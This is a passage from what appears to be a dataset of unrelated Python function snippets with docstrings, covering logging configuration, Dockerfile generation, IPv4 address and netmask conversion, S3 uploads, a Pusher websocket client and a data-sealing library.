verify your logger config'\n                 ' and permissions to write to {0} ({1})'\n                 .format(log_file, e))"
        ],
        [
            "def configure_custom(self, config):\n        \"\"\"Configure an object with a user-supplied factory.\"\"\"\n        c = config.pop('()')\n        if not hasattr(c, '__call__') and \\\n                hasattr(types, 'ClassType') and isinstance(c, types.ClassType):\n            c = self.resolve(c)\n        props = config.pop('.', None)\n        # Check for valid identifiers\n        kwargs = dict((k, config[k]) for k in config if valid_ident(k))\n        result = c(**kwargs)\n        if props:\n            for name, value in props.items():\n                setattr(result, name, value)\n        return result"
        ],
        [
            "def _set_global_verbosity_level(is_verbose_output=False):\n    \"\"\"sets the global verbosity level for console and the jocker_lgr logger.\n\n    :param bool is_verbose_output: should be output be verbose\n    \"\"\"\n    global verbose_output\n    # TODO: (IMPRV) only raise exceptions in verbose mode\n    verbose_output = is_verbose_output\n    if verbose_output:\n        jocker_lgr.setLevel(logging.DEBUG)\n    else:\n        jocker_lgr.setLevel(logging.INFO)"
        ],
        [
            "def _import_config(config_file):\n    \"\"\"returns a configuration object\n\n    :param string config_file: path to config file\n    \"\"\"\n    # get config file path\n    jocker_lgr.debug('config file is: {0}'.format(config_file))\n    # append to path for importing\n    try:\n        jocker_lgr.debug('importing config...')\n        with open(config_file, 'r') as c:\n            return yaml.safe_load(c.read())\n    except IOError as ex:\n        jocker_lgr.error(str(ex))\n        raise RuntimeError('cannot access config file')\n    except yaml.parser.ParserError as ex:\n        jocker_lgr.error('invalid yaml file: {0}'.format(ex))\n        raise RuntimeError('invalid yaml file')"
        ],
        [
            "def execute(varsfile, templatefile, outputfile=None, configfile=None,\n            dryrun=False, build=False, push=False, verbose=False):\n    \"\"\"generates a Dockerfile, builds an image and pushes it to DockerHub\n\n    A `Dockerfile` will be generated by Jinja2 according to the `varsfile`\n    imported. If build is true, an image will be generated from the\n    `outputfile` which is the generated Dockerfile and committed to the\n    image:tag string supplied to `build`.\n    If push is true, a build will be triggered and the produced image\n    will be pushed to DockerHub upon completion.\n\n    :param string varsfile: path to file with variables.\n    :param string templatefile: path to template file to use.\n    :param string outputfile: path to output Dockerfile.\n    :param string configfile: path to yaml file with docker-py config.\n    :param bool dryrun: mock run.\n    :param build: False or the image:tag to build to.\n    :param push: False or the image:tag to build to. (triggers build)\n    :param bool verbose: verbose output.\n    \"\"\"\n    if dryrun and (build or push):\n        jocker_lgr.error('dryrun requested, cannot build.')\n        sys.exit(100)\n\n    _set_global_verbosity_level(verbose)\n    j = Jocker(varsfile, templatefile, outputfile, configfile, dryrun,\n               build, push)\n    formatted_text = j.generate()\n    if dryrun:\n        g = j.dryrun(formatted_text)\n    if build or push:\n        j.build_image()\n    if push:\n        j.push_image()\n    if dryrun:\n        return g"
        ],
        [
            "def _parse_dumb_push_output(self, string):\n        \"\"\"since the push process outputs a single unicode string consisting of\n        multiple JSON formatted \"status\" lines, we need to parse it so that it\n        can be read as multiple strings.\n\n        This will receive the string as an input, count curly braces and ignore\n        any newlines. When the curly braces stack is 0, it will append the\n        entire string it has read up until then to a list and so forth.\n\n        :param string: the string to parse\n        :rtype: list of JSON's\n        \"\"\"\n        stack = 0\n        json_list = []\n        tmp_json = ''\n        for char in string:\n            if not char == '\\r' and not char == '\\n':\n                tmp_json += char\n            if char == '{':\n                stack += 1\n            elif char == '}':\n                stack -= 1\n            if stack == 0:\n                if not len(tmp_json) == 0:\n                    json_list.append(tmp_json)\n                tmp_json = ''\n        return json_list"
        ],
        [
            "def upload_gif(gif):\n    \"\"\"Uploads an image file to Imgur\"\"\"\n\n    client_id = os.environ.get('IMGUR_API_ID')\n    client_secret = os.environ.get('IMGUR_API_SECRET')\n\n    if client_id is None or client_secret is None:\n        click.echo('Cannot upload - could not find IMGUR_API_ID or IMGUR_API_SECRET environment variables')\n        return\n\n    client = ImgurClient(client_id, client_secret)\n\n    click.echo('Uploading file {}'.format(click.format_filename(gif)))\n\n    response = client.upload_from_path(gif)\n\n    click.echo('File uploaded - see your gif at {}'.format(response['link']))"
        ],
        [
            "def is_dot(ip):\n    \"\"\"Return true if the IP address is in dotted decimal notation.\"\"\"\n    octets = str(ip).split('.')\n    if len(octets) != 4:\n        return False\n    for i in octets:\n        try:\n            val = int(i)\n        except ValueError:\n            return False\n        if val > 255 or val < 0:\n            return False\n    return True"
        ],
        [
            "def is_bin(ip):\n    \"\"\"Return true if the IP address is in binary notation.\"\"\"\n    try:\n        ip = str(ip)\n        if len(ip) != 32:\n            return False\n        dec = int(ip, 2)\n    except (TypeError, ValueError):\n        return False\n    if dec > 4294967295 or dec < 0:\n        return False\n    return True"
        ],
        [
            "def is_oct(ip):\n    \"\"\"Return true if the IP address is in octal notation.\"\"\"\n    try:\n        dec = int(str(ip), 8)\n    except (TypeError, ValueError):\n        return False\n    if dec > 0o37777777777 or dec < 0:\n        return False\n    return True"
        ],
        [
            "def is_dec(ip):\n    \"\"\"Return true if the IP address is in decimal notation.\"\"\"\n    try:\n        dec = int(str(ip))\n    except ValueError:\n        return False\n    if dec > 4294967295 or dec < 0:\n        return False\n    return True"
        ],
        [
            "def _check_nm(nm, notation):\n    \"\"\"Function internally used to check if the given netmask\n    is of the specified notation.\"\"\"\n    # Convert to decimal, and check if it's in the list of valid netmasks.\n    _NM_CHECK_FUNCT = {\n        NM_DOT: _dot_to_dec,\n        NM_HEX: _hex_to_dec,\n        NM_BIN: _bin_to_dec,\n        NM_OCT: _oct_to_dec,\n        NM_DEC: _dec_to_dec_long}\n    try:\n        dec = _NM_CHECK_FUNCT[notation](nm, check=True)\n    except ValueError:\n        return False\n    if dec in _NETMASKS_VALUES:\n        return True\n    return False"
        ],
        [
            "def is_bits_nm(nm):\n    \"\"\"Return true if the netmask is in bits notatation.\"\"\"\n    try:\n        bits = int(str(nm))\n    except ValueError:\n        return False\n    if bits > 32 or bits < 0:\n        return False\n    return True"
        ],
        [
            "def is_wildcard_nm(nm):\n    \"\"\"Return true if the netmask is in wildcard bits notatation.\"\"\"\n    try:\n        dec = 0xFFFFFFFF - _dot_to_dec(nm, check=True)\n    except ValueError:\n        return False\n    if dec in _NETMASKS_VALUES:\n        return True\n    return False"
        ],
        [
            "def _dot_to_dec(ip, check=True):\n    \"\"\"Dotted decimal notation to decimal conversion.\"\"\"\n    if check and not is_dot(ip):\n        raise ValueError('_dot_to_dec: invalid IP: \"%s\"' % ip)\n    octets = str(ip).split('.')\n    dec = 0\n    dec |= int(octets[0]) << 24\n    dec |= int(octets[1]) << 16\n    dec |= int(octets[2]) << 8\n    dec |= int(octets[3])\n    return dec"
        ],
        [
            "def _dec_to_dot(ip):\n    \"\"\"Decimal to dotted decimal notation conversion.\"\"\"\n    first = int((ip >> 24) & 255)\n    second = int((ip >> 16) & 255)\n    third = int((ip >> 8) & 255)\n    fourth = int(ip & 255)\n    return '%d.%d.%d.%d' % (first, second, third, fourth)"
        ],
        [
            "def _hex_to_dec(ip, check=True):\n    \"\"\"Hexadecimal to decimal conversion.\"\"\"\n    if check and not is_hex(ip):\n        raise ValueError('_hex_to_dec: invalid IP: \"%s\"' % ip)\n    if isinstance(ip, int):\n        ip = hex(ip)\n    return int(str(ip), 16)"
        ],
        [
            "def _oct_to_dec(ip, check=True):\n    \"\"\"Octal to decimal conversion.\"\"\"\n    if check and not is_oct(ip):\n        raise ValueError('_oct_to_dec: invalid IP: \"%s\"' % ip)\n    if isinstance(ip, int):\n        ip = oct(ip)\n    return int(str(ip), 8)"
        ],
        [
            "def _bin_to_dec(ip, check=True):\n    \"\"\"Binary to decimal conversion.\"\"\"\n    if check and not is_bin(ip):\n        raise ValueError('_bin_to_dec: invalid IP: \"%s\"' % ip)\n    if isinstance(ip, int):\n        ip = str(ip)\n    return int(str(ip), 2)"
        ],
        [
            "def _BYTES_TO_BITS():\n    \"\"\"Generate a table to convert a whole byte to binary.\n    This code was taken from the Python Cookbook, 2nd edition - O'Reilly.\"\"\"\n    the_table = 256*[None]\n    bits_per_byte = list(range(7, -1, -1))\n    for n in range(256):\n        l = n\n        bits = 8*[None]\n        for i in bits_per_byte:\n            bits[i] = '01'[n & 1]\n            n >>= 1\n        the_table[l] = ''.join(bits)\n    return the_table"
        ],
        [
            "def _dec_to_bin(ip):\n    \"\"\"Decimal to binary conversion.\"\"\"\n    bits = []\n    while ip:\n        bits.append(_BYTES_TO_BITS[ip & 255])\n        ip >>= 8\n    bits.reverse()\n    return ''.join(bits) or 32*'0'"
        ],
        [
            "def _bits_to_dec(nm, check=True):\n    \"\"\"Bits to decimal conversion.\"\"\"\n    if check and not is_bits_nm(nm):\n        raise ValueError('_bits_to_dec: invalid netmask: \"%s\"' % nm)\n    bits = int(str(nm))\n    return VALID_NETMASKS[bits]"
        ],
        [
            "def _wildcard_to_dec(nm, check=False):\n    \"\"\"Wildcard bits to decimal conversion.\"\"\"\n    if check and not is_wildcard_nm(nm):\n        raise ValueError('_wildcard_to_dec: invalid netmask: \"%s\"' % nm)\n    return 0xFFFFFFFF - _dot_to_dec(nm, check=False)"
        ],
        [
            "def _detect(ip, _isnm):\n    \"\"\"Function internally used to detect the notation of the\n    given IP or netmask.\"\"\"\n    ip = str(ip)\n    if len(ip) > 1:\n        if ip[0:2] == '0x':\n            if _CHECK_FUNCT[IP_HEX][_isnm](ip):\n                return IP_HEX\n        elif ip[0] == '0':\n            if _CHECK_FUNCT[IP_OCT][_isnm](ip):\n                return IP_OCT\n    if _CHECK_FUNCT[IP_DOT][_isnm](ip):\n        return IP_DOT\n    elif _isnm and _CHECK_FUNCT[NM_BITS][_isnm](ip):\n        return NM_BITS\n    elif _CHECK_FUNCT[IP_DEC][_isnm](ip):\n        return IP_DEC\n    elif _isnm and _CHECK_FUNCT[NM_WILDCARD][_isnm](ip):\n        return NM_WILDCARD\n    elif _CHECK_FUNCT[IP_BIN][_isnm](ip):\n        return IP_BIN\n    return IP_UNKNOWN"
        ],
        [
            "def _convert(ip, notation, inotation, _check, _isnm):\n    \"\"\"Internally used to convert IPs and netmasks to other notations.\"\"\"\n    inotation_orig = inotation\n    notation_orig = notation\n    inotation = _get_notation(inotation)\n    notation = _get_notation(notation)\n    if inotation is None:\n        raise ValueError('_convert: unknown input notation: \"%s\"' % inotation_orig)\n    if notation is None:\n        raise ValueError('_convert: unknown output notation: \"%s\"' % notation_orig)\n    docheck = _check or False\n    if inotation == IP_UNKNOWN:\n        inotation = _detect(ip, _isnm)\n        if inotation == IP_UNKNOWN:\n            raise ValueError('_convert: unable to guess input notation or invalid value')\n        if _check is None:\n            docheck = True\n    # We _always_ check this case later.\n    if _isnm:\n        docheck = False\n    dec = 0\n    if inotation == IP_DOT:\n        dec = _dot_to_dec(ip, docheck)\n    elif inotation == IP_HEX:\n        dec = _hex_to_dec(ip, docheck)\n    elif inotation == IP_BIN:\n        dec = _bin_to_dec(ip, docheck)\n    elif inotation == IP_OCT:\n        dec = _oct_to_dec(ip, docheck)\n    elif inotation == IP_DEC:\n        dec = _dec_to_dec_long(ip, docheck)\n    elif _isnm and inotation == NM_BITS:\n        dec = _bits_to_dec(ip, docheck)\n    elif _isnm and inotation == NM_WILDCARD:\n        dec = _wildcard_to_dec(ip, docheck)\n    else:\n        raise ValueError('_convert: unknown IP/netmask notation: \"%s\"' % inotation_orig)\n    # Ensure this is a valid netmask.\n    if _isnm and dec not in _NETMASKS_VALUES:\n        raise ValueError('_convert: invalid netmask: \"%s\"' % ip)\n    if notation == IP_DOT:\n        return _dec_to_dot(dec)\n    elif notation == IP_HEX:\n        return _dec_to_hex(dec)\n    elif notation == IP_BIN:\n        return _dec_to_bin(dec)\n    elif notation == IP_OCT:\n        return _dec_to_oct(dec)\n    elif notation == IP_DEC:\n        return _dec_to_dec_str(dec)\n    elif _isnm and notation == NM_BITS:\n        return _dec_to_bits(dec)\n    elif _isnm and notation == NM_WILDCARD:\n        return _dec_to_wildcard(dec)\n    else:\n        raise ValueError('convert: unknown notation: \"%s\"' % notation_orig)"
        ],
        [
            "def convert(ip, notation=IP_DOT, inotation=IP_UNKNOWN, check=True):\n    \"\"\"Convert among IP address notations.\n\n    Given an IP address, this function returns the address\n    in another notation.\n\n    @param ip: the IP address.\n    @type ip: integers, strings or object with an appropriate __str()__ method.\n\n    @param notation: the notation of the output (default: IP_DOT).\n    @type notation: one of the IP_* constants, or the equivalent strings.\n\n    @param inotation: force the input to be considered in the given notation\n                    (default the notation of the input is autodetected).\n    @type inotation: one of the IP_* constants, or the equivalent strings.\n\n    @param check: force the notation check on the input.\n    @type check: True force the check, False force not to check and None\n                do the check only if the inotation is unknown.\n\n    @return: a string representing the IP in the selected notation.\n\n    @raise ValueError: raised when the input is in unknown notation.\"\"\"\n    return _convert(ip, notation, inotation, _check=check, _isnm=False)"
        ],
        [
            "def convert_nm(nm, notation=IP_DOT, inotation=IP_UNKNOWN, check=True):\n    \"\"\"Convert a netmask to another notation.\"\"\"\n    return _convert(nm, notation, inotation, _check=check, _isnm=True)"
        ],
        [
            "def _add(self, other):\n        \"\"\"Sum two IP addresses.\"\"\"\n        if isinstance(other, self.__class__):\n            sum_ = self._ip_dec + other._ip_dec\n        elif isinstance(other, int):\n            sum_ = self._ip_dec + other\n        else:\n            other = self.__class__(other)\n            sum_ = self._ip_dec + other._ip_dec\n        return sum_"
        ],
        [
            "def _sub(self, other):\n        \"\"\"Subtract two IP addresses.\"\"\"\n        if isinstance(other, self.__class__):\n            sub = self._ip_dec - other._ip_dec\n        if isinstance(other, int):\n            sub = self._ip_dec - other\n        else:\n            other = self.__class__(other)\n            sub = self._ip_dec - other._ip_dec\n        return sub"
        ],
        [
            "def get_bits(self):\n        \"\"\"Return the bits notation of the netmask.\"\"\"\n        return _convert(self._ip, notation=NM_BITS,\n                        inotation=IP_DOT, _check=False, _isnm=self._isnm)"
        ],
        [
            "def get_wildcard(self):\n        \"\"\"Return the wildcard bits notation of the netmask.\"\"\"\n        return _convert(self._ip, notation=NM_WILDCARD,\n                        inotation=IP_DOT, _check=False, _isnm=self._isnm)"
        ],
        [
            "def set(self, ip, netmask=None):\n        \"\"\"Set the IP address and the netmask.\"\"\"\n        if isinstance(ip, str) and netmask is None:\n            ipnm = ip.split('/')\n            if len(ipnm) != 2:\n                raise ValueError('set: invalid CIDR: \"%s\"' % ip)\n            ip = ipnm[0]\n            netmask = ipnm[1]\n        if isinstance(ip, IPv4Address):\n            self._ip = ip\n        else:\n            self._ip = IPv4Address(ip)\n        if isinstance(netmask, IPv4NetMask):\n            self._nm = netmask\n        else:\n            self._nm = IPv4NetMask(netmask)\n        ipl = int(self._ip)\n        nml = int(self._nm)\n        base_add = ipl & nml\n        self._ip_num = 0xFFFFFFFF - 1 - nml\n        # NOTE: quite a mess.\n        #      This's here to handle /32 (-1) and /31 (0) netmasks.\n        if self._ip_num in (-1, 0):\n            if self._ip_num == -1:\n                self._ip_num = 1\n            else:\n                self._ip_num = 2\n            self._net_ip = None\n            self._bc_ip = None\n            self._first_ip_dec = base_add\n            self._first_ip = IPv4Address(self._first_ip_dec, notation=IP_DEC)\n            if self._ip_num == 1:\n                last_ip_dec = self._first_ip_dec\n            else:\n                last_ip_dec = self._first_ip_dec + 1\n            self._last_ip = IPv4Address(last_ip_dec, notation=IP_DEC)\n            return\n        self._net_ip = IPv4Address(base_add, notation=IP_DEC)\n        self._bc_ip = IPv4Address(base_add + self._ip_num + 1, notation=IP_DEC)\n        self._first_ip_dec = base_add + 1\n        self._first_ip = IPv4Address(self._first_ip_dec, notation=IP_DEC)\n        self._last_ip = IPv4Address(base_add + self._ip_num, notation=IP_DEC)"
        ],
        [
            "def set_ip(self, ip):\n        \"\"\"Change the current IP.\"\"\"\n        self.set(ip=ip, netmask=self._nm)"
        ],
        [
            "def set_netmask(self, netmask):\n        \"\"\"Change the current netmask.\"\"\"\n        self.set(ip=self._ip, netmask=netmask)"
        ],
        [
            "def is_valid_ip(self, ip):\n        \"\"\"Return true if the given address in amongst the usable addresses,\n        or if the given CIDR is contained in this one.\"\"\"\n        if not isinstance(ip, (IPv4Address, CIDR)):\n            if str(ip).find('/') == -1:\n                ip = IPv4Address(ip)\n            else:\n                # Support for CIDR strings/objects, an idea of Nicola Novello.\n                ip = CIDR(ip)\n        if isinstance(ip, IPv4Address):\n            if ip < self._first_ip or ip > self._last_ip:\n                return False\n        elif isinstance(ip, CIDR):\n            # NOTE: manage /31 networks; 127.0.0.1/31 is considered to\n            #       be included in 127.0.0.1/8.\n            if ip._nm._ip_dec == 0xFFFFFFFE \\\n                    and self._nm._ip_dec != 0xFFFFFFFE:\n                compare_to_first = self._net_ip._ip_dec\n                compare_to_last = self._bc_ip._ip_dec\n            else:\n                compare_to_first = self._first_ip._ip_dec\n                compare_to_last = self._last_ip._ip_dec\n            if ip._first_ip._ip_dec < compare_to_first or \\\n                    ip._last_ip._ip_dec > compare_to_last:\n                return False\n        return True"
        ],
        [
            "async def upload_file(self, bucket, file, uploadpath=None, key=None,\n                          ContentType=None, **kw):\n        \"\"\"Upload a file to S3 possibly using the multi-part uploader\n        Return the key uploaded\n        \"\"\"\n        is_filename = False\n\n        if hasattr(file, 'read'):\n            if hasattr(file, 'seek'):\n                file.seek(0)\n            file = file.read()\n            size = len(file)\n        elif key:\n            size = len(file)\n        else:\n            is_filename = True\n            size = os.stat(file).st_size\n            key = os.path.basename(file)\n\n        assert key, 'key not available'\n\n        if not ContentType:\n            ContentType, _ = mimetypes.guess_type(key)\n\n        if uploadpath:\n            if not uploadpath.endswith('/'):\n                uploadpath = '%s/' % uploadpath\n            key = '%s%s' % (uploadpath, key)\n\n        params = dict(Bucket=bucket, Key=key)\n\n        if not ContentType:\n            ContentType = 'application/octet-stream'\n\n        params['ContentType'] = ContentType\n\n        if size > MULTI_PART_SIZE and is_filename:\n            resp = await _multipart(self, file, params)\n        elif is_filename:\n            with open(file, 'rb') as fp:\n                params['Body'] = fp.read()\n            resp = await self.put_object(**params)\n        else:\n            params['Body'] = file\n            resp = await self.put_object(**params)\n        if 'Key' not in resp:\n            resp['Key'] = key\n        if 'Bucket' not in resp:\n            resp['Bucket'] = bucket\n        return resp"
        ],
        [
            "async def copy_storage_object(self, source_bucket, source_key,\n                                  bucket, key):\n        \"\"\"Copy a file from one bucket into another\n        \"\"\"\n        info = await self.head_object(Bucket=source_bucket, Key=source_key)\n        size = info['ContentLength']\n\n        if size > MULTI_PART_SIZE:\n            result = await _multipart_copy(self, source_bucket, source_key,\n                                           bucket, key, size)\n        else:\n            result = await self.copy_object(\n                Bucket=bucket, Key=key,\n                CopySource=_source_string(source_bucket, source_key)\n            )\n        return result"
        ],
        [
            "def upload_folder(self, bucket, folder, key=None, skip=None,\n                      content_types=None):\n        \"\"\"Recursively upload a ``folder`` into a backet.\n\n        :param bucket: bucket where to upload the folder to\n        :param folder: the folder location in the local file system\n        :param key: Optional key where the folder is uploaded\n        :param skip: Optional list of files to skip\n        :param content_types: Optional dictionary mapping suffixes to\n            content types\n        :return: a coroutine\n        \"\"\"\n        uploader = FolderUploader(self, bucket, folder, key, skip,\n                                  content_types)\n        return uploader.start()"
        ],
        [
            "async def _upload_file(self, full_path):\n        \"\"\"Coroutine for uploading a single file\n        \"\"\"\n        rel_path = os.path.relpath(full_path, self.folder)\n        key = s3_key(os.path.join(self.key, rel_path))\n        ct = self.content_types.get(key.split('.')[-1])\n        with open(full_path, 'rb') as fp:\n            file = fp.read()\n        try:\n            await self.botocore.upload_file(self.bucket, file, key=key,\n                                            ContentType=ct)\n        except Exception as exc:\n            LOGGER.error('Could not upload \"%s\": %s', key, exc)\n            self.failures[key] = self.all.pop(full_path)\n            return\n        size = self.all.pop(full_path)\n        self.success[key] = size\n        self.total_size += size\n        percentage = 100*(1 - len(self.all)/self.total_files)\n        message = '{0:.0f}% completed - uploaded \"{1}\" - {2}'.format(\n            percentage, key, convert_bytes(size))\n        LOGGER.info(message)"
        ],
        [
            "async def trigger(self, event, data=None, socket_id=None):\n        '''Trigger an ``event`` on this channel\n        '''\n        json_data = json.dumps(data, cls=self.pusher.encoder)\n        query_string = self.signed_query(event, json_data, socket_id)\n        signed_path = \"%s?%s\" % (self.path, query_string)\n        pusher = self.pusher\n        absolute_url = pusher.get_absolute_path(signed_path)\n        response = await pusher.http.post(\n            absolute_url, data=json_data,\n            headers=[('Content-Type', 'application/json')])\n        response.raise_for_status()\n        return response.status_code == 202"
        ],
        [
            "async def connect(self):\n        '''Connect to a Pusher websocket\n        '''\n        if not self._consumer:\n            waiter = self._waiter = asyncio.Future()\n            try:\n                address = self._websocket_host()\n                self.logger.info('Connect to %s', address)\n                self._consumer = await self.http.get(address)\n                if self._consumer.status_code != 101:\n                    raise PusherError(\"Could not connect to websocket\")\n            except Exception as exc:\n                waiter.set_exception(exc)\n                raise\n            else:\n                await waiter\n        return self._consumer"
        ],
        [
            "def on_message(self, websocket, message):\n        '''Handle websocket incoming messages\n        '''\n        waiter = self._waiter\n        self._waiter = None\n        encoded = json.loads(message)\n        event = encoded.get('event')\n        channel = encoded.get('channel')\n        data = json.loads(encoded.get('data'))\n        try:\n            if event == PUSHER_ERROR:\n                raise PusherError(data['message'], data['code'])\n            elif event == PUSHER_CONNECTION:\n                self.socket_id = data.get('socket_id')\n                self.logger.info('Succesfully connected on socket %s',\n                                 self.socket_id)\n                waiter.set_result(self.socket_id)\n            elif event == PUSHER_SUBSCRIBED:\n                self.logger.info('Succesfully subscribed to %s',\n                                 encoded.get('channel'))\n            elif channel:\n                self[channel]._event(event, data)\n        except Exception as exc:\n            if waiter:\n                waiter.set_exception(exc)\n            else:\n                self.logger.exception('pusher error')"
        ],
        [
            "def const_equal(str_a, str_b):\n    '''Constant time string comparison'''\n\n    if len(str_a) != len(str_b):\n        return False\n\n    result = True\n    for i in range(len(str_a)):\n        result &= (str_a[i] == str_b[i])\n\n    return result"
        ],
        [
            "def decode_html_entities(html):\n    \"\"\"\n    Decodes a limited set of HTML entities.\n    \"\"\"\n    if not html:\n        return html\n\n    for entity, char in six.iteritems(html_entity_map):\n        html = html.replace(entity, char)\n\n    return html"
        ],
        [
            "def set_signature_passphrases(self, signature_passphrases):\n        '''Set signature passphrases'''\n        self.signature_passphrases = self._update_dict(signature_passphrases,\n                                                       {}, replace_data=True)"
        ],
        [
            "def set_encryption_passphrases(self, encryption_passphrases):\n        '''Set encryption passphrases'''\n        self.encryption_passphrases = self._update_dict(encryption_passphrases,\n                                                        {}, replace_data=True)"
        ],
        [
            "def set_algorithms(self, signature=None, encryption=None,\n                       serialization=None, compression=None):\n        '''Set algorithms used for sealing. Defaults can not be overridden.'''\n\n        self.signature_algorithms = \\\n            self._update_dict(signature, self.DEFAULT_SIGNATURE)\n\n        self.encryption_algorithms = \\\n            self._update_dict(encryption, self.DEFAULT_ENCRYPTION)\n\n        self.serialization_algorithms = \\\n            self._update_dict(serialization, self.DEFAULT_SERIALIZATION)\n\n        self.compression_algorithms = \\\n            self._update_dict(compression, self.DEFAULT_COMPRESSION)"
        ],
        [
            "def get_algorithms(self):\n        '''Get algorithms used for sealing'''\n\n        return {\n            'signature': self.signature_algorithms,\n            'encryption': self.encryption_algorithms,\n            'serialization': self.serialization_algorithms,\n            'compression': self.compression_algorithms,\n        }"
        ],
        [
            "def _set_options(self, options):\n        '''Private function for setting options used for sealing'''\n        if not options:\n            return self.options.copy()\n\n        options = options.copy()\n\n        if 'magic' in options:\n            self.set_magic(options['magic'])\n            del(options['magic'])\n\n        if 'flags' in options:\n            flags = options['flags']\n            del(options['flags'])\n            for key, value in flags.iteritems():\n                if not isinstance(value, bool):\n                    raise TypeError('Invalid flag type for: %s' % key)\n        else:\n            flags = self.options['flags']\n\n        if 'info' in options:\n            del(options['info'])\n\n        for key, value in options.iteritems():\n            if not isinstance(value, int):\n                raise TypeError('Invalid option type for: %s' % key)\n            if value < 0 or value > 255:\n                raise ValueError('Option value out of range for: %s' % key)\n\n        new_options = self.options.copy()\n        new_options.update(options)\n        new_options['flags'].update(flags)\n\n        return new_options"
        ],
        [
            "def verify_signature(self, data):\n        '''Verify sealed data signature'''\n\n        data = self._remove_magic(data)\n        data = urlsafe_nopadding_b64decode(data)\n        options = self._read_header(data)\n        data = self._add_magic(data)\n        self._unsign_data(data, options)"
        ],
        [
            "def _encode(self, data, algorithm, key=None):\n        '''Encode data with specific algorithm'''\n\n        if algorithm['type'] == 'hmac':\n            return data + self._hmac_generate(data, algorithm, key)\n        elif algorithm['type'] == 'aes':\n            return self._aes_encrypt(data, algorithm, key)\n        elif algorithm['type'] == 'no-serialization':\n            return data\n        elif algorithm['type'] == 'json':\n            return json.dumps(data)\n        elif algorithm['type'] == 'no-compression':\n            return data\n        elif algorithm['type'] == 'gzip':\n            return self._zlib_compress(data, algorithm)\n        else:\n            raise Exception('Algorithm not supported: %s' % algorithm['type'])"
        ],
        [
            "def _decode(self, data, algorithm, key=None):\n        '''Decode data with specific algorithm'''\n\n        if algorithm['type'] == 'hmac':\n            verify_signature = data[-algorithm['hash_size']:]\n            data = data[:-algorithm['hash_size']]\n            signature = self._hmac_generate(data, algorithm, key)\n            if not const_equal(verify_signature, signature):\n                raise Exception('Invalid signature')\n            return data\n        elif algorithm['type'] == 'aes':\n            return self._aes_decrypt(data, algorithm, key)\n        elif algorithm['type'] == 'no-serialization':\n            return data\n        elif algorithm['type'] == 'json':\n            return json.loads(data)\n        elif algorithm['type'] == 'no-compression':\n            return data\n        elif algorithm['type'] == 'gzip':\n            return self._zlib_decompress(data, algorithm)\n        else:\n            raise Exception('Algorithm not supported: %s' % algorithm['type'])"
        ],
        [
            "def _sign_data(self, data, options):\n        '''Add signature to data'''\n\n        if options['signature_algorithm_id'] not in self.signature_algorithms:\n            raise Exception('Unknown signature algorithm id: %d'\n                            % options['signature_algorithm_id'])\n\n        signature_algorithm = \\\n            self.signature_algorithms[options['signature_algorithm_id']]\n\n        algorithm = self._get_algorithm_info(signature_algorithm)\n\n        key_salt = get_random_bytes(algorithm['salt_size'])\n        key = self._generate_key(options['signature_passphrase_id'],\n                            self.signature_passphrases, key_salt, algorithm)\n\n        data = self._encode(data, algorithm, key)\n\n        return data + key_salt"
        ],
        [
            "def _unsign_data(self, data, options):\n        '''Verify and remove signature'''\n\n        if options['signature_algorithm_id'] not in self.signature_algorithms:\n            raise Exception('Unknown signature algorithm id: %d'\n                            % options['signature_algorithm_id'])\n\n        signature_algorithm = \\\n            self.signature_algorithms[options['signature_algorithm_id']]\n\n        algorithm = self._get_algorithm_info(signature_algorithm)\n\n        key_salt = ''\n        if algorithm['salt_size']:\n            key_salt = data[-algorithm['salt_size']:]\n            data = data[:-algorithm['salt_size']]\n\n        key = self._generate_key(options['signature_passphrase_id'],\n                            self.signature_passphrases, key_salt, algorithm)\n\n        data = self._decode(data, algorithm, key)\n\n        return data"
        ],
        [
            "def _remove_magic(self, data):\n        '''Verify and remove magic'''\n\n        if not self.magic:\n            return data\n\n        magic_size = len(self.magic)\n        magic = data[:magic_size]\n        if magic != self.magic:\n            raise Exception('Invalid magic')\n        data = data[magic_size:]\n\n        return data"
        ],
        [
            "def _add_header(self, data, options):\n        '''Add header to data'''\n\n        # pylint: disable=W0142\n\n        version_info = self._get_version_info(options['version'])\n\n        flags = options['flags']\n\n        header_flags = dict(\n            (i, str(int(j))) for i, j in options['flags'].iteritems())\n        header_flags = ''.join(version_info['flags'](**header_flags))\n        header_flags = int(header_flags, 2)\n        options['flags'] = header_flags\n\n        header = version_info['header']\n        header = header(**options)\n        header = pack(version_info['header_format'], *header)\n\n        if 'timestamp' in flags and flags['timestamp']:\n            timestamp = long(time())\n            timestamp = pack(version_info['timestamp_format'], timestamp)\n            header = header + timestamp\n\n        return header + data"
        ],
        [
            "def _read_header(self, data):\n        '''Read header from data'''\n\n        # pylint: disable=W0212\n\n        version = self._read_version(data)\n        version_info = self._get_version_info(version)\n        header_data = data[:version_info['header_size']]\n        header = version_info['header']\n        header = header._make(\n            unpack(version_info['header_format'], header_data))\n        header = dict(header._asdict())\n\n        flags = list(\"{0:0>8b}\".format(header['flags']))\n        flags = dict(version_info['flags']._make(flags)._asdict())\n        flags = dict((i, bool(int(j))) for i, j in flags.iteritems())\n        header['flags'] = flags\n\n        timestamp = None\n        if flags['timestamp']:\n            ts_start = version_info['header_size']\n            ts_end = ts_start + version_info['timestamp_size']\n            timestamp_data = data[ts_start:ts_end]\n            timestamp = unpack(\n                version_info['timestamp_format'], timestamp_data)[0]\n        header['info'] = {'timestamp': timestamp}\n\n        return header"
        ],
        [
            "def _remove_header(self, data, options):\n        '''Remove header from data'''\n\n        version_info = self._get_version_info(options['version'])\n        header_size = version_info['header_size']\n\n        if options['flags']['timestamp']:\n            header_size += version_info['timestamp_size']\n\n        data = data[header_size:]\n\n        return data"
        ],
        [
            "def _read_version(self, data):\n        '''Read header version from data'''\n\n        version = ord(data[0])\n        if version not in self.VERSIONS:\n            raise Exception('Version not defined: %d' % version)\n        return version"
        ],
        [
            "def _get_algorithm_info(self, algorithm_info):\n        '''Get algorithm info'''\n\n        if algorithm_info['algorithm'] not in self.ALGORITHMS:\n            raise Exception('Algorithm not supported: %s'\n                            % algorithm_info['algorithm'])\n\n        algorithm = self.ALGORITHMS[algorithm_info['algorithm']]\n        algorithm_info.update(algorithm)\n\n        return algorithm_info"
        ],
        [
